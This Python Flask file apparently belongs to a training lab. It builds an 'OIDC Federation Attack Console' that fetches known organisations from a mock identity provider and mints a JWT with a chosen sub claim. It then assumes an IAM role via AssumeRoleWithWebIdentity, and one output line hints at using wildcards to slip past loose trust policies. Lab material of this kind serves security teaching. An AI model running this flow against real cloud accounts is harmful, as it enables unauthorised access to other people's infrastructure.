"""OIDC Federation Attack Console — multi-step IAM trust policy bypass."""
import os, json, urllib.request, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
OIDC = os.environ.get("OIDC_URL", "http://oidc:5000")
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML="""<!DOCTYPE html><html><head><title>OIDC Federation Attack</title></head><body>
<h1>OIDC Federation Attack Console</h1>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 1: Discover repos</strong> — List known orgs from the OIDC IdP.
<form method=post action=/step1><button>Discover Repos</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 2: Get JWT</strong> — Request a JWT with a specific sub claim.
<form method=post action=/step2>
<label>Sub claim: <input name=sub size=50 placeholder="repo:demo-org/demo-repo:ref:refs/heads/main"></label><br>
<label>Audience: <input name=aud value="sts.amazonaws.com"></label><br>
<button>Get Token</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 3: Assume Role</strong> — Use the JWT to assume an IAM role via OIDC.
<form method=post action=/step3>
<label>Role ARN: <input name=role size=55 placeholder="arn:aws:iam::000000000000:role/GitHubActionsRole"></label><br>
<label>JWT: <input name=jwt size=80 placeholder="Paste JWT from Step 2"></label><br>
<button>Assume Role</button></form></div>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — follow the steps above")

@app.route("/step1", methods=["POST"])
def step1():
    try:
        r = urllib.request.urlopen(f"{OIDC}/orgs", timeout=5)
        orgs = json.loads(r.read().decode())
        return render_template_string(HTML, output=f"[+] Known organizations:\n{json.dumps(orgs, indent=2)}\n\n[→] Use a repo from these orgs to construct your sub claim.")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step2", methods=["POST"])
def step2():
    sub = request.form.get("sub", "")
    aud = request.form.get("aud", "sts.amazonaws.com")
    if not sub:
        return render_template_string(HTML, output="Error: sub claim required")
    try:
        req = urllib.request.Request(f"{OIDC}/token",
            data=json.dumps({"sub": sub, "aud": aud}).encode(),
            headers={"Content-Type": "application/json"})
        r = urllib.request.urlopen(req, timeout=5)
        result = json.loads(r.read().decode())
        if "access_token" in result:
            return render_template_string(HTML,
                output=f"[+] JWT obtained!\n\nToken: {result['access_token'][:100]}...\n\n[→] Copy this token and use it in Step 3 with a role ARN.\n\n[→] Hint: if IdP rejects an exact repo, try using wildcards (*) for broader access.")
        return render_template_string(HTML, output=f"[-] IdP returned: {json.dumps(result, indent=2)}")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] IdP error ({e.code}): {e.read().decode()}")

@app.route("/step3", methods=["POST"])
def step3():
    role = request.form.get("role", "")
    jwt_token = request.form.get("jwt", "")
    if not role or not jwt_token:
        return render_template_string(HTML, output="Error: role ARN and JWT required")
    try:
        body = urllib.parse.urlencode({
            "Action": "AssumeRoleWithWebIdentity",
            "RoleArn": role,
            "WebIdentityToken": jwt_token,
            "RoleSessionName": "oidc-attack",
            "Version": "2011-06-15",
        })
        r = urllib.request.urlopen(urllib.request.Request(
            f"{IAM}/", data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"}),
            timeout=10)
        return render_template_string(HTML, output=f"[+] AssumeRole Response:\n{r.read().decode()}")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] IAM error ({e.code}): {e.read().decode()}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
